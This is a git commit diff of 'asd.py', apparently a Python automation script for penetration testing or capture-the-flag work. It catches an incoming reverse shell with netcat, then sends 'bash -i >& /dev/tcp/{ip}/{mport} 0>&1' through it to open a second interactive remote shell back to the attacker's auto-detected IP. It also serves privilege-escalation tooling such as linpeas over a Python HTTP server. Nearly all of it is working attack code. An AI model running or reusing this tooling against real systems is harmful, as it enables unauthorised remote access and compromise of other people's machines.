30b14176f7296dacb0b507be6365147361348683
Mario Vata <33606897+mariovata@users.noreply.github.com>
2023-02-20 16:22:12 +0100

    Improved asd.py

--- asd.py
+++ asd.py
@@ -4,6 +4,9 @@ import argparse
 import random
 import threading, time
 from datetime import datetime
+import socket
+import fcntl
+import struct
 
 
 def parse_args():
@@ -15,13 +18,16 @@ def parse_args():
     return args
 
 
-def reverse_shell_recon(tmp_dir, port, current_os, lport, ip):
+def reverse_shell_recon(tmp_dir, port, current_os, lport, ip, mport):
     p = process("/bin/bash")  # Spawns a process
     p.sendline(f"nc -lvnp {port}")
 
     needle = "connect to"
     # Wait for needle to appear in the output
     p.recvuntil(needle)
+
+    # Spawn a new shell for the manual shell
+    p.sendline(f"bash -i >& /dev/tcp/{ip}/{mport} 0>&1")
 
     if os.path.exists("./linpeas.sh"):
         print("The file exists")
@@ -46,6 +52,19 @@ def file_server(lport):
     p = process("/bin/bash")
     p.sendline(f"python3 -m http.server {lport}")
 
+def manual_shell(mport):
+    p = process("/bin/bash")
+    print(mport)
+    p.sendline(f"nc -lvnp {mport}")
+    p.interactive()
+
+def get_ip_address(ifname):
+    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    return socket.inet_ntoa(fcntl.ioctl(
+        s.fileno(),
+        0x8915,  # SIOCGIFADDR
+        struct.pack('256s', ifname[:15].encode())
+    )[20:24])
 
 def main():
     tmp_dir = "/tmp/" + "".join(random.choices(string.ascii_uppercase + string.digits, k=10))
@@ -53,14 +72,20 @@ def main():
     args = parse_args()
 
     lport = args.lport
-    current_os = args.os
     port = args.port
-    ip = "192.168.1.7"
+    mport = random.randint(1024, 65535)
+    # Random port for the reverse shell that is not the same as the file server or the reverse shell or Burp
+    while mport == port or mport == lport or mport == 8080:
+        mport = random.randint(1024, 65535)
+    current_os = args.os
+    ip = get_ip_address("eth0")
 
     # 1. Spawn the reverse shell recon thread
-    threading.Thread(target=reverse_shell_recon, args=(tmp_dir, port, current_os, lport, ip)).start()
+    threading.Thread(target=reverse_shell_recon, args=(tmp_dir, port, current_os, lport, ip,mport)).start()
     # 2. Spawn the file server thread
     threading.Thread(target=file_server, args=(lport,)).start()
+    # 3. Spawn the manual shell thread
+    threading.Thread(target=manual_shell, args=(mport,)).start()
 
 
 if __name__ == "__main__":
